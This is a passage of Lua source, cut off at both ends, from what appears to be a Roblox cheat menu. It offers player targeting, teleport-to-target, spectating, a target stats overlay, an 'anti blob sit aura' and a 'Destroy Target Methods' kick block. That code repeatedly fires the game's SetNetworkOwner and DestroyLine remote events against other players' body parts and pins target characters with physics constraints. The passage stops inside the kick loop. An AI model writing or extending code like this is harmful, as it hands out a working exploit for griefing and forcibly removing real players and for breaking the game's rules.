					fn16(stickyPart, v24, v23)
					notify2("Defend", "Attached to " .. arg.Name, 2)
				end

				local function fn18()
					local tbl6 = {}

					for _, player in pairs(ps2:GetPlayers()) do
						if player ~= lp4 then
							table.insert(tbl6, player.DisplayName .. " | " .. player.Name)
						end
					end

					table.sort(tbl6)

					if v22 then
						v22:Refresh(tbl6)
					end
				end

				v22 = v20:CreateDropdown({
					Name = "Select friend",
					Items = {},
					Default = "",
					Callback = function(arg)
						if not arg or arg == "" then
							v21 = nil
							return
						end
						v21 = ps2:FindFirstChild(arg:split(" | ")[2])
					end,
				})

				v20:CreateKeybind({
					Name = "Defend [Shuriken]",
					Default = Enum.KeyCode.Seven,
					Flag = "DefendFriendBind",
					Callback = function()
						task.spawn(function()
							if not v21 or not v21.Parent then
								notify2("Defend", "Select a friend first", 2)
								return
							end
							fn17(v21)
						end)
					end,
				})

				task.spawn(function()
					while true do
						fn18()
						task.wait(1)
					end
				end)
			end

			local v20
			v20 = _G.ProtectionTab:CreateBlock({ Name = "Anti Blobman", Side = "Right", ImageID = "15911231575" })
			local lp4, flag10, thread

			do
				local Players = game:GetService("Players")
				lp4 = _G.LP or Players.LocalPlayer
				local Workspace = game:GetService("Workspace")
				local ReplicatedStorage = game:GetService("ReplicatedStorage")

				if not _G.CF then
				end

				local v34 = _G.V3 or Vector3.new
				local destroyLine = _G.DestroyLine
				local grabEvents = ReplicatedStorage:FindFirstChild("GrabEvents")
				grabEvents = grabEvents and grabEvents:FindFirstChild("SetNetworkOwner")
				local flag11 = false
				flag10 = false
				thread = nil
				local tbl6 = {}

				local function fn15(arg)
					return arg:IsA("Model") and arg.Name == "CreatureBlobman"
				end

				local function fn16(arg)
					if not arg then
						return
					end
					local leftDetector = arg:FindFirstChild("LeftDetector")

					if leftDetector then
						pcall(function()
							leftDetector:Destroy()
						end)
					end

					local rightDetector = arg:FindFirstChild("RightDetector")

					if rightDetector then
						pcall(function()
							rightDetector:Destroy()
						end)
					end
				end

				local function fn17(arg)
					for _, v21 in ipairs(tbl6) do
						if v21 == arg then
							return
						end
					end

					table.insert(tbl6, arg)

					arg.ChildAdded:Connect(function(child)
						if flag11 and (child.Name == "LeftDetector" or child.Name == "RightDetector") then
							pcall(function()
								child:Destroy()
							end)
						end
					end)

					if flag11 then
						task.wait()
						fn16(arg)
					end
				end

				local function fn18(arg)
					for i, v21 in ipairs(tbl6) do
						if v21 == arg then
							table.remove(tbl6, i)
							break
						end
					end
				end

				local function fn19(arg)
					for _, child in pairs(arg:GetChildren()) do
						if fn15(child) then
							fn17(child)
						end
					end

					arg.ChildAdded:Connect(function(child)
						if fn15(child) then
							fn17(child)
						end
					end)

					arg.ChildRemoved:Connect(function(child)
						if fn15(child) then
							fn18(child)
						end
					end)
				end

				local function fn20(arg)
					local v21 = Workspace:FindFirstChild(arg.Name .. "SpawnedInToys")

					if v21 then
						fn19(v21)
					end
				end

				for _, player in pairs(Players:GetPlayers()) do
					fn20(player)
				end

				Players.PlayerAdded:Connect(function(player)
					player.CharacterAdded:Connect(function()
						task.wait()
						fn20(player)
					end)
				end)

				local function fn21(arg)
					for _, player in pairs(Players:GetPlayers()) do
						if player == lp4 then
							continue
						end
						local character = player.Character
						character = character and character:FindFirstChild("Humanoid")
						if character and character.SeatPart and character.SeatPart:IsDescendantOf(arg) then
							return player
						end
					end

					return nil
				end

				local function fn22(arg)
					if not grabEvents then
						return
					end
					local character = arg.Character
					if not character then
						return
					end

					for _, descendant in pairs(character:GetDescendants()) do
						if descendant:IsA("BasePart") then
							pcall(function()
								grabEvents:FireServer(descendant, descendant.CFrame)
							end)
						end
					end
				end

				local function fn23(arg)
					local character = arg.Character
					if not character then
						return false
					end

					for _, descendant in pairs(character:GetDescendants()) do
						if descendant.Name == "PartOwner" and descendant:IsA("StringValue") and descendant.Value == lp4.Name then
							return true
						end
					end

					return false
				end

				local function fn24(arg)
					if not arg then
						return false
					end
					local partOwner = arg:FindFirstChild("PartOwner")
					return partOwner and partOwner.Value == lp4.Name
				end

				local function fn25(arg)
					local seat = arg:FindFirstChildOfClass("Seat")
					if seat then
						return seat
					end

					for _, descendant in pairs(arg:GetDescendants()) do
						local isBasePart = descendant:IsA("BasePart")
						local pos

						if isBasePart then
							pos = descendant.Name:find("Seat") or descendant.Name:find("Sit") or descendant.Name:find("Humanoid")
						else
							pos = isBasePart
						end

						if pos then
							return descendant
						end
					end

					return arg.PrimaryPart or arg:FindFirstChildWhichIsA("BasePart")
				end

				local function fn26(arg)
					local character = arg.Character
					local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
					if not humanoidRootPart then
						return
					end

					pcall(function()
						humanoidRootPart.CFrame = humanoidRootPart.CFrame + v34(0, 8, 0)
						humanoidRootPart.AssemblyLinearVelocity = v34(0, 80, 0)
					end)
				end

				local function fn27(arg, arg2)
					if not grabEvents then
						return
					end
					local character = arg2.Character
					if not character then
						return
					end
					local humanoid = character:FindFirstChild("Humanoid")
					local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
					if not humanoid or not humanoidRootPart then
						return
					end

					if humanoid.Sit then
						fn22(arg2)

						if fn23(arg2) and destroyLine then
							pcall(function()
								destroyLine:FireServer(humanoidRootPart)
							end)
						end
					else
						local v21 = fn25(arg)

						if v21 and v21.Parent then
							for i = 1, 1 do
								pcall(function()
									grabEvents:FireServer(v21, v21.CFrame)
								end)
							end

							if fn24(v21) then
								fn26(arg2)
							end
						end
					end
				end

				local function fn28()
					flag11 = true

					for _, v21 in ipairs(tbl6) do
						fn16(v21)
					end
				end

				local function fn29()
					flag11 = false
				end

				local function fn30()
					flag10 = true

					thread = task.spawn(function()
						while flag10 do
							local character = lp4.Character
							character = character and character:FindFirstChild("HumanoidRootPart")

							if character then
								for _, v21 in ipairs(tbl6) do
									local primaryPart = v21.PrimaryPart or v21:FindFirstChildWhichIsA("BasePart")

									if primaryPart and primaryPart.Parent and (character.Position - primaryPart.Position).Magnitude <= 30 then
										local v22 = fn21(v21)

										if v22 then
											fn27(v21, v22)
										end
									end
								end
							end

							task.wait(0.2)
						end
					end)
				end

				local function fn31()
					flag10 = false

					if thread then
						task.cancel(thread)
						thread = nil
					end
				end

				v20:CreateToggle({
					Name = "Disable blob arms",
					Default = false,
					Callback = function(arg)
						if arg then
							fn28()
						else
							fn29()
						end
					end,
				})

				v20:CreateToggle({
					Name = "Anti blob sit aura",
					Default = false,
					Callback = function(arg)
						if arg then
							fn30()
						else
							fn31()
						end
					end,
				})
			end

			targetTab = _G.TargetTab
			ps = _G.PS
			lp = _G.LP
			notify = _G.Notify

			do
				local playSound = _G.PlaySound
				local sounds = _G.Sounds
				local slower = _G.slower
				local sfind = _G.sfind
				blackHoleDetector = _G.BlackHoleDetector
				ws = _G.WS
				rs = _G.RS
				cf = _G.CF
				v32 = _G.V3
				currentCamera = workspace.CurrentCamera
				UserInputService = game:GetService("UserInputService")

				selected = {
					kickPlayer = nil,
					currentPlayer = nil,
					targetUserId = nil,
					targetName = nil,
					targetDisplayName = nil,
				}

				_G.Selected = selected
				tbl5 = {}
				v16 = nil
				v17 = nil
				flag7 = false
				connection = nil
				part2 = nil
				flag8 = false
				connection2 = nil

				local function fn15(arg)
					arg = arg and slower(arg) or ""
					local tbl6 = {}

					for _, player in pairs(ps:GetPlayers()) do
						if player ~= lp then
							local str5 = player.DisplayName .. " | " .. player.Name
							local v21 = slower(str5)

							if arg == "" or sfind(v21, arg, 1, true) then
								table.insert(tbl6, str5)
							end
						end
					end

					table.sort(tbl6)
					return tbl6
				end

				fn12 = function(noPlayersFoundWith)
					local v21 = fn15(noPlayersFoundWith)

					if #v21 == 0 and noPlayersFoundWith ~= "" then
						notify("Search", "No players found with: " .. noPlayersFoundWith, 1)
					end

					tbl5 = v21

					if v16 then
						v16:Refresh(v21)
					end
				end

				fn13 = function(kickPlayer)
					if not kickPlayer then
						return
					end
					selected.kickPlayer = kickPlayer
					selected.currentPlayer = kickPlayer
					selected.targetUserId = kickPlayer.UserId
					selected.targetName = kickPlayer.Name
					selected.targetDisplayName = kickPlayer.DisplayName
					local str5 = kickPlayer.DisplayName .. " | " .. kickPlayer.Name

					if v17 then
						v17:SetValue("")
					end

					fn12("")

					task.defer(function()
						if v16 then
							v16:SetValue(str5)
						end
					end)

					if flag7 then
						stopLine()
						startLine()
					end

					if flag8 then
						stopSpectate()
						startSpectate(kickPlayer)
					end

					if _G.KickMethodsToggle and _G.KickMethodsToggle.Get and _G.KickMethodsToggle:Get() then
						local kickMethodsToggle = _G.KickMethodsToggle
						kickMethodsToggle:Set(false)
						task.wait(0.1)
						kickMethodsToggle:Set(true)
					end

					notify("Target Selected", "Target: " .. kickPlayer.DisplayName, 2)
					playSound(sounds.Notify)
				end
			end
		end

		do
			local function fn14()
				if not selected.currentPlayer then
					return
				end
				local character = selected.currentPlayer.Character
				if not character then
					return
				end
				local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return
				end
				local character2 = lp.Character
				if not character2 then
					return
				end
				local humanoidRootPart2 = character2:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart2 then
					return
				end
				humanoidRootPart2.CFrame = humanoidRootPart.CFrame * cf(0, 2, 0)
				humanoidRootPart2.AssemblyLinearVelocity = v32(0, 0, 0)
				humanoidRootPart2.Velocity = v32(0, 0, 0)
			end

			local function fn15()
				if not flag7 then
					return
				end

				if not selected.currentPlayer then
					if part2 and part2.Parent then
						part2:Destroy()
						part2 = nil
					end

					return
				end

				local character = lp.Character
				local character2 = selected.currentPlayer.Character

				if not character or not character2 then
					if part2 and part2.Parent then
						part2:Destroy()
						part2 = nil
					end

					return
				end

				local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
				local humanoidRootPart2 = character2:FindFirstChild("HumanoidRootPart")

				if not humanoidRootPart or not humanoidRootPart2 then
					if part2 and part2.Parent then
						part2:Destroy()
						part2 = nil
					end

					return
				end

				local position = humanoidRootPart.Position
				local position2 = humanoidRootPart2.Position
				local magnitude = (position - position2).Magnitude
				local n25 = (position + position2) / 2

				if not part2 or not part2.Parent then
					part2 = Instance.new("Part")
					part2.Name = "TargetLine"
					part2.Size = v32(0.1, 0.1, magnitude)
					part2.Anchored = true
					part2.CanCollide = false
					part2.CanTouch = false
					part2.CanQuery = false
					part2.Transparency = 0.3
					part2.Color = Color3.fromRGB(255, 255, 255)
					part2.Material = Enum.Material.Neon
					part2.Parent = ws
				else
					part2.Size = v32(0.1, 0.1, magnitude)
				end

				part2.CFrame = CFrame.new(n25, position2)
			end

			local function fn16()
				if connection then
					connection:Disconnect()
				end

				flag7 = true

				if part2 and part2.Parent then
					part2:Destroy()
					part2 = nil
				end

				connection = rs.RenderStepped:Connect(fn15)
			end

			local function fn17()
				flag7 = false

				if connection then
					connection:Disconnect()
					connection = nil
				end

				if part2 and part2.Parent then
					part2:Destroy()
					part2 = nil
				end
			end

			local function fn18(arg)
				if not arg then
					return false
				end
				local character = arg.Character
				if not character then
					return false
				end
				local humanoid = character:FindFirstChild("Humanoid")
				if not humanoid then
					return false
				end
				return humanoid.Health > 0
			end

			local function fn19(arg)
				if not arg then
					if connection2 then
						connection2:Disconnect()
						connection2 = nil
					end

					return
				end

				flag8 = true

				if connection2 then
					connection2:Disconnect()
				end

				local function fn20()
					if not flag8 then
						return
					end

					if not arg then
						return
					end

					if not fn18(arg) then
						stopSpectate()
						return
					end
					local character = arg.Character

					if character then
						local humanoid = character:FindFirstChild("Humanoid")

						if humanoid then
							currentCamera.CameraSubject = humanoid
							currentCamera.CameraType = Enum.CameraType.Custom
						end
					end
				end

				fn20()
				connection2 = rs.RenderStepped:Connect(fn20)
			end

			local function fn20()
				flag8 = false

				if connection2 then
					connection2:Disconnect()
					connection2 = nil
				end

				if lp.Character and lp.Character:FindFirstChild("Humanoid") then
					currentCamera.CameraSubject = lp.Character.Humanoid
					currentCamera.CameraType = Enum.CameraType.Custom
				end
			end

			local v18 = targetTab:CreateBlock({ Name = "Selection", Side = "Left", ImageID = "86821503536548" })

			v17 = v18:CreateInput({
				Name = "Search Player",
				Default = "",
				Placeholder = "Type to search...",
				Callback = function(arg)
					fn12(arg)
				end,
			})

			v16 = v18:CreateDropdown({
				Name = "Select Player",
				Items = tbl5,
				Default = "",
				Callback = function(arg)
					if not arg or arg == "" then
						selected.kickPlayer = nil
						selected.currentPlayer = nil
						selected.targetUserId = nil
						selected.targetName = nil
						selected.targetDisplayName = nil

						if flag7 then
							fn17()
						end

						if flag8 then
							fn20()
						end

						if _G.KickMethodsToggle and _G.KickMethodsToggle.Get and _G.KickMethodsToggle:Get() then
							_G.KickMethodsToggle:Set(false)
						end

						return
					end

					local v19 = ps:FindFirstChild(arg:match("%|%s(.+)$") or arg)

					if v19 then
						fn13(v19)
					end
				end,
			})

			v18:CreateKeybind({
				Name = "Select Target by Mouse",
				Default = Enum.KeyCode.R,
				HoldToInteract = false,
				Callback = function()
					local mouse = lp:GetMouse()
					local v19 = nil

					if mouse.Target then
						v19 = nil

						for _, player in pairs(ps:GetPlayers()) do
							if player == lp then
								v19 = nil
							else
								local character = player.Character

								if character and mouse.Target:IsDescendantOf(character) then
									v19 = player
									break
								else
									v19 = nil
								end
							end
						end
					end

					if v19 then
						fn13(v19)
					end
				end,
			})

			v18:CreateButton({
				Name = "Teleport to Target",
				Callback = function()
					fn14()
				end,
			})

			v18:CreateToggle({
				Name = "Target Line Tracker",
				Default = false,
				Callback = function(arg)
					if arg then
						if not selected.currentPlayer then
							v18:GetToggle("Target Line Tracker"):Set(false)
							return
						end
						fn16()
					else
						fn17()
					end
				end,
			})

			v18:CreateToggle({
				Name = "Spectate Target",
				Default = false,
				Callback = function(arg)
					if arg then
						if not selected.currentPlayer then
							v18:GetToggle("Spectate Target"):Set(false)
							return
						end

						if not fn18(selected.currentPlayer) then
							notify("Spectate", "Target is dead or has no character", 2)
							v18:GetToggle("Spectate Target"):Set(false)
							return
						end

						fn19(selected.currentPlayer)
					else
						fn20()
					end
				end,
			})

			ps.PlayerRemoving:Connect(function(player)
				if selected.currentPlayer == player then
					selected.targetUserId = player.UserId
					selected.targetName = player.Name
					selected.targetDisplayName = player.DisplayName
					selected.kickPlayer = nil
					selected.currentPlayer = nil
					local flag9 = blackHoleDetector and blackHoleDetector.lastKickedUserId == player.UserId
					local flag10 = false

					if flag9 then
						if tick() - (blackHoleDetector.lastKickTime or 0) < 3 then
							flag10 = true
						end
					end

					if not flag10 then
						fn17()

						if flag8 then
							fn20()
						end

						if _G.KickMethodsToggle and _G.KickMethodsToggle.Get and _G.KickMethodsToggle:Get() then
							_G.KickMethodsToggle:Set(false)
						end
					end
				end

				task.defer(function()
					fn12(v17 and v17:GetValue() or "")
				end)
			end)

			ps.PlayerAdded:Connect(function(player)
				if selected.targetUserId and player.UserId == selected.targetUserId then
					fn13(player)
				else
					fn12(v17 and v17:GetValue() or "")
				end
			end)

			fn12("")
			local screenGui = nil
			local connection3 = nil
			local flag9 = false
			local v19 = nil
			local connection4 = nil

			local function fn21()
				if screenGui then
					screenGui:Destroy()
				end

				local tbl6 = {
					bg = Color3.fromRGB(25, 25, 25),
					stroke = Color3.fromRGB(60, 60, 60),
					accent = Color3.fromRGB(209, 164, 222),
					text = Color3.fromRGB(235, 235, 235),
					sub = Color3.fromRGB(200, 200, 200),
				}

				screenGui = Instance.new("ScreenGui")
				screenGui.Name = "TargetStats"
				screenGui.ResetOnSpawn = false
				screenGui.IgnoreGuiInset = true
				screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
				screenGui.Parent = game:GetService("CoreGui")
				local frame2 = Instance.new("Frame")
				frame2.Name = "Container"
				frame2.Size = UDim2.new(0, 360, 0, 250)
				frame2.Position = UDim2.new(0, 20, 1, -305)
				frame2.BackgroundColor3 = tbl6.bg
				frame2.BorderSizePixel = 0
				frame2.ClipsDescendants = false
				frame2.ZIndex = 100
				frame2.Parent = screenGui
				local uiCorner = Instance.new("UICorner")
				uiCorner.CornerRadius = UDim.new(0, 8)
				uiCorner.Parent = frame2
				local uiStroke = Instance.new("UIStroke")
				uiStroke.Color = tbl6.stroke
				uiStroke.Thickness = 1.2
				uiStroke.Parent = frame2
				local frame3 = Instance.new("Frame")
				frame3.Size = UDim2.new(1, 0, 0, 3)
				frame3.Position = UDim2.new(0, 0, 0, -1)
				frame3.BackgroundColor3 = tbl6.accent
				frame3.BorderSizePixel = 0
				frame3.ZIndex = 101
				frame3.Parent = frame2
				local uiCorner2 = Instance.new("UICorner")
				uiCorner2.CornerRadius = UDim.new(0, 8)
				uiCorner2.Parent = frame3
				local textButton = Instance.new("TextButton")
				textButton.Size = UDim2.new(1, 0, 0, 56)
				textButton.BackgroundTransparency = 1
				textButton.BorderSizePixel = 0
				textButton.Text = ""
				textButton.AutoButtonColor = false
				textButton.ZIndex = 102
				textButton.Parent = frame2
				local textLabel = Instance.new("TextLabel")
				textLabel.Name = "TitleLabel"
				textLabel.Size = UDim2.new(1, -20, 1, 0)
				textLabel.Position = UDim2.new(0, 10, 0, 6)
				textLabel.BackgroundTransparency = 1
				textLabel.Text = "TARGET STATS"
				textLabel.TextColor3 = tbl6.text
				textLabel.TextSize = 13
				textLabel.Font = Enum.Font.Code
				textLabel.TextXAlignment = Enum.TextXAlignment.Left
				textLabel.TextYAlignment = Enum.TextYAlignment.Top
				textLabel.TextWrapped = true
				textLabel.RichText = true
				textLabel.ZIndex = 103
				textLabel.Parent = textButton
				local frame4 = Instance.new("Frame")
				frame4.Name = "Content"
				frame4.Size = UDim2.new(1, -20, 1, -64)
				frame4.Position = UDim2.new(0, 10, 0, 58)
				frame4.BackgroundTransparency = 1
				frame4.ZIndex = 101
				frame4.Parent = frame2
				local uiListLayout = Instance.new("UIListLayout")
				uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				uiListLayout.Padding = UDim.new(0, 6)
				uiListLayout.Parent = frame4
				local tbl7 = {}

				for i, v20 in ipairs({
					{ key = "hp", label = "Health" },
					{ key = "speed", label = "Speed" },
					{ key = "dist", label = "Distance" },
					{ key = "ragdoll", label = "Ragdoll" },
					{ key = "inplot", label = "In Plot" },
					{ key = "seat", label = "Seat" },
					{ key = "partowner", label = "Part Owner" },
				}) do
					local frame5 = Instance.new("Frame")
					frame5.Size = UDim2.new(1, 0, 0, 20)
					frame5.BackgroundTransparency = 1
					frame5.LayoutOrder = i
					frame5.ZIndex = 102
					frame5.Parent = frame4
					local textLabel2 = Instance.new("TextLabel")
					textLabel2.Size = UDim2.new(0.55, 0, 1, 0)
					textLabel2.BackgroundTransparency = 1
					textLabel2.Text = v20.label
					textLabel2.TextColor3 = tbl6.sub
					textLabel2.TextSize = 13
					textLabel2.Font = Enum.Font.Code
					textLabel2.TextXAlignment = Enum.TextXAlignment.Left
					textLabel2.ZIndex = 102
					textLabel2.Parent = frame5
					local textLabel3 = Instance.new("TextLabel")
					textLabel3.Name = "Value"
					textLabel3.Size = UDim2.new(0.45, 0, 1, 0)
					textLabel3.Position = UDim2.new(0.55, 0, 0, 0)
					textLabel3.BackgroundTransparency = 1
					textLabel3.Text = "--"
					textLabel3.TextColor3 = tbl6.text
					textLabel3.TextSize = 13
					textLabel3.Font = Enum.Font.Code
					textLabel3.TextXAlignment = Enum.TextXAlignment.Right
					textLabel3.TextTruncate = Enum.TextTruncate.AtEnd
					textLabel3.ZIndex = 102
					textLabel3.Parent = frame5
					tbl7[v20.key] = textLabel3
				end

				local flag10 = false
				local v20 = nil
				local position = nil
				local position2 = nil

				textButton.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
						flag10 = true
						position = input.Position
						position2 = frame2.Position

						input.Changed:Connect(function()
							if input.UserInputState == Enum.UserInputState.End then
								flag10 = false
							end
						end)
					end
				end)

				textButton.InputChanged:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
						v20 = input
					end
				end)

				connection4 = UserInputService.InputChanged:Connect(function(input)
					if input == v20 and flag10 then
						local n25 = input.Position - position
						frame2.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n25.X, position2.Y.Scale, position2.Y.Offset + n25.Y)
					end
				end)

				return { labels = tbl7, title = textLabel }
			end

			local function fn22()
				if not flag9 or not v19 then
					return
				end
				local labels = v19.labels
				local title = v19.title
				local currentPlayer = selected.currentPlayer

				if currentPlayer then
					title.Text = "Target: " .. currentPlayer.DisplayName .. " | " .. currentPlayer.Name .. "\nStatus: still on the server"
				elseif selected.targetName then
					title.Text = "<font color=\"rgb(220, 80, 80)\">Target: " .. selected.targetDisplayName .. " | " .. selected.targetName .. "\nleave from the server!</font>"
				else
					title.Text = "TARGET STATS\nSelect a target..."
				end

				if not currentPlayer then
					for _, label in pairs(labels) do
						label.Text = "--"
						label.TextColor3 = Color3.fromRGB(235, 235, 235)
					end

					return
				end

				local character = currentPlayer.Character
				local character2 = lp.Character
				character2 = character2 and character2:FindFirstChild("HumanoidRootPart")

				if not character then
					for _, label in pairs(labels) do
						label.Text = "no char"
						label.TextColor3 = Color3.fromRGB(200, 80, 80)
					end

					return
				end

				local humanoid = character:FindFirstChildOfClass("Humanoid")
				local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

				if humanoid then
					local n25 = math.floor(humanoid.Health)
					labels.hp.Text = n25 .. " / " .. math.max(math.floor(humanoid.MaxHealth), 1)

					if n25 <= 0 then
						labels.hp.TextColor3 = Color3.fromRGB(220, 80, 80)
					else
						labels.hp.TextColor3 = Color3.fromRGB(235, 235, 235)
					end
				else
					labels.hp.Text = "--"
					labels.hp.TextColor3 = Color3.fromRGB(235, 235, 235)
				end

				if humanoidRootPart then
					local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
					labels.speed.Text = math.floor(Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z).Magnitude) .. " u/s"
					labels.speed.TextColor3 = Color3.fromRGB(235, 235, 235)
				else
					labels.speed.Text = "--"
					labels.speed.TextColor3 = Color3.fromRGB(235, 235, 235)
				end

				if humanoidRootPart and character2 then
					labels.dist.Text = math.floor((humanoidRootPart.Position - character2.Position).Magnitude) .. " st"
					labels.dist.TextColor3 = Color3.fromRGB(235, 235, 235)
				else
					labels.dist.Text = "--"
					labels.dist.TextColor3 = Color3.fromRGB(235, 235, 235)
				end

				local ragdolled = humanoid and humanoid:FindFirstChild("Ragdolled")

				if ragdolled then
					local flag10 = ragdolled.Value == true
					labels.ragdoll.Text = flag10 and "Yes" or "No"

					if flag10 then
						labels.ragdoll.TextColor3 = Color3.fromRGB(220, 80, 80)
					else
						labels.ragdoll.TextColor3 = Color3.fromRGB(235, 235, 235)
					end
				else
					labels.ragdoll.Text = "--"
					labels.ragdoll.TextColor3 = Color3.fromRGB(235, 235, 235)
				end

				local playersInPlots = ws:FindFirstChild("PlotItems") and ws.PlotItems:FindFirstChild("PlayersInPlots")

				if playersInPlots then
					local flag10 = playersInPlots:FindFirstChild(currentPlayer.Name) ~= nil
					labels.inplot.Text = flag10 and "Yes" or "No"

					if flag10 then
						labels.inplot.TextColor3 = Color3.fromRGB(220, 80, 80)
					else
						labels.inplot.TextColor3 = Color3.fromRGB(235, 235, 235)
					end
				else
					labels.inplot.Text = "--"
					labels.inplot.TextColor3 = Color3.fromRGB(235, 235, 235)
				end

				if humanoid then
					local seatPart = humanoid.SeatPart

					if seatPart then
						local parent = seatPart.Parent
						labels.seat.Text = parent and parent ~= ws and parent.Name or seatPart.Name
						labels.seat.TextColor3 = Color3.fromRGB(220, 160, 60)
					else
						labels.seat.Text = "none"
						labels.seat.TextColor3 = Color3.fromRGB(150, 150, 165)
					end
				else
					labels.seat.Text = "--"
					labels.seat.TextColor3 = Color3.fromRGB(235, 235, 235)
				end

				local head = character:FindFirstChild("Head")
				local isHeld = character:FindFirstChild("isHeld") or head and head:FindFirstChild("isHeld")
				local partOwner

				if head then
					partOwner = head:FindFirstChild("PartOwner") or head:FindFirstChild("Owner") or head:FindFirstChild("partOwner")
				else
					partOwner = head
				end

				partOwner = partOwner or character:FindFirstChild("PartOwner")

				if isHeld and isHeld.Value or partOwner then
					local text

					if partOwner then
						text = tostring(partOwner.Value)
					else
						text = nil

						if humanoidRootPart then
							local ok, result = pcall(function()
								return humanoidRootPart:GetNetworkOwner()
							end)

							local flag10 = ok and result and result ~= lp
							text = nil

							if flag10 then
								text = result.Name
							end
						end
					end

					labels.partowner.Text = text or "Held"
					labels.partowner.TextColor3 = Color3.fromRGB(220, 160, 60)
				else
					labels.partowner.Text = "none"
					labels.partowner.TextColor3 = Color3.fromRGB(150, 150, 165)
				end
			end

			local function fn23()
				if flag9 then
					return
				end
				flag9 = true
				v19 = fn21()
				connection3 = rs.RenderStepped:Connect(fn22)
			end

			local function fn24()
				flag9 = false

				if connection3 then
					connection3:Disconnect()
					connection3 = nil
				end

				if connection4 then
					connection4:Disconnect()
					connection4 = nil
				end

				if screenGui then
					screenGui:Destroy()
					screenGui = nil
					v19 = nil
				end
			end

			v18:CreateToggle({
				Name = "Statistics for Target",
				Default = false,
				Callback = function(arg)
					if arg then
						fn23()
					else
						fn24()
					end
				end,
			})
		end

		local v18
		v18 = _G.TargetTab:CreateBlock({ Name = "Destroy Target Methods", Side = "Right", ImageID = "15911231575" })
		_G.KickMethodsBlock = v18
		local selected2
		selected2 = _G.Selected

		do
			local permanentPallet = _G.States.PermanentPallet
			local lp2 = _G.LP
			local ws2 = _G.WS
			local ps2 = _G.PS
			local sno = _G.SNO
			local cf2 = _G.CF
			local v33 = _G.V3
			local flag9 = false
			local kickThreads = {}
			_G.kickEnabled = false
			_G.kickThreads = kickThreads
			_G.destroyLineWait = 0.01
			_G.noRagdollEnabled = true
			local v19 = nil
			local fallenPartsDestroyHeight = ws2.FallenPartsDestroyHeight
			local cFrame = nil
			local str5 = "Kick"
			local n25 = 0
			local n26 = 0
			local n27 = 0
			local thread = nil
			local kickPlayer = nil

			local function fn14()
				flag9 = false
				_G.kickEnabled = false

				for _, kickThread in ipairs(kickThreads) do
					if kickThread then
						task.cancel(kickThread)
					end
				end

				kickThreads = {}
				_G.kickThreads = kickThreads
				v19 = nil

				for _, player in pairs(ps2:GetPlayers()) do
					local character = player.Character

					if character then
						for _, descendant in ipairs(character:GetDescendants()) do
							if descendant.Name:find("KickHold") or descendant.Name:find("PartOwner") then
								descendant:Destroy()
							end
						end

						for _, v20 in ipairs({
							"Head",
							"Torso",
							"UpperTorso",
							"LowerTorso",
							"HumanoidRootPart",
							"Left Arm",
							"Right Arm",
							"Left Leg",
							"Right Leg",
						}) do
							local v21 = character:FindFirstChild(v20)

							if v21 then
								v21.CanCollide = true
								v21.CanTouch = true
								v21.Velocity = v33(0, 0, 0)
								v21.AssemblyLinearVelocity = v33(0, 0, 0)
							end
						end
					end
				end

				if cFrame then
					local character = lp2.Character

					if character then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

						if humanoidRootPart then
							humanoidRootPart.CFrame = cFrame
							humanoidRootPart.Velocity = v33(0, 0, 0)
						end
					end

					cFrame = nil
				end

				ws2.FallenPartsDestroyHeight = fallenPartsDestroyHeight
			end

			local function fn15(arg)
				if arg then
					arg.Velocity = v33(0, 0, 0)
					arg.AssemblyLinearVelocity = v33(0, 0, 0)
					arg.RotVelocity = v33(0, 0, 0)
					arg.AssemblyAngularVelocity = v33(0, 0, 0)
				end
			end

			local function fn16(arg)
				if not arg then
					return
				end
				local humanoidRootPart = arg:FindFirstChild("HumanoidRootPart")
				if not humanoidRootPart then
					return
				end
				local kickHoldGyro = humanoidRootPart:FindFirstChild("KickHoldGyro")

				if not kickHoldGyro then
					kickHoldGyro = Instance.new("BodyGyro")
					kickHoldGyro.Name = "KickHoldGyro"
					kickHoldGyro.MaxTorque = v33(math.huge, math.huge, math.huge)
					kickHoldGyro.P = 50000
					kickHoldGyro.D = 100
					kickHoldGyro.Parent = humanoidRootPart
				end

				kickHoldGyro.CFrame = CFrame.new(humanoidRootPart.Position, humanoidRootPart.Position + v33(1, 0, 0))
			end

			local function fn17(arg, arg2)
				local soundPart = arg2 and arg2:FindFirstChild("SoundPart")
				local flag10 = false
				local cFrame2 = nil

				local function fn18(arg3, arg4)
					for _, v20 in ipairs({ "Head", "Torso", "UpperTorso", "LowerTorso", "Left Arm", "Right Arm", "Left Leg", "Right Leg" }) do
						local v21 = arg3:FindFirstChild(v20)

						if v21 then
							if arg4 then
								fn15(v21)
								v21.CanCollide = false
								v21.CanTouch = false
							else
								v21.CanCollide = true
								v21.CanTouch = true
							end
						end
					end
				end

				local function fn19(parent, position, arg3)
					local kickHoldBP = parent:FindFirstChild("KickHoldBP")

					if not kickHoldBP then
						kickHoldBP = Instance.new("BodyPosition")
						kickHoldBP.Name = "KickHoldBP"
						kickHoldBP.Parent = parent
					end

					kickHoldBP.MaxForce = v33(math.huge, math.huge, math.huge)
					kickHoldBP.P = 50000
					kickHoldBP.D = 100
					kickHoldBP.Position = position
					local kickHoldBG = parent:FindFirstChild("KickHoldBG")

					if not kickHoldBG then
						kickHoldBG = Instance.new("BodyGyro")
						kickHoldBG.Name = "KickHoldBG"
						kickHoldBG.MaxTorque = v33(math.huge, math.huge, math.huge)
						kickHoldBG.P = 50000
						kickHoldBG.D = 100
						kickHoldBG.Parent = parent
					end

					kickHoldBG.CFrame = CFrame.new(parent.Position, parent.Position + arg3)
				end

				local thread2 = task.spawn(function()
					while _G.kickEnabled and arg and arg.Parent do
						local character = lp2.Character
						character = character and character:FindFirstChild("HumanoidRootPart")

						if not character then
							task.wait()
						else
							local character2 = arg.Character
							local humanoid = character2 and character2:FindFirstChild("Humanoid")
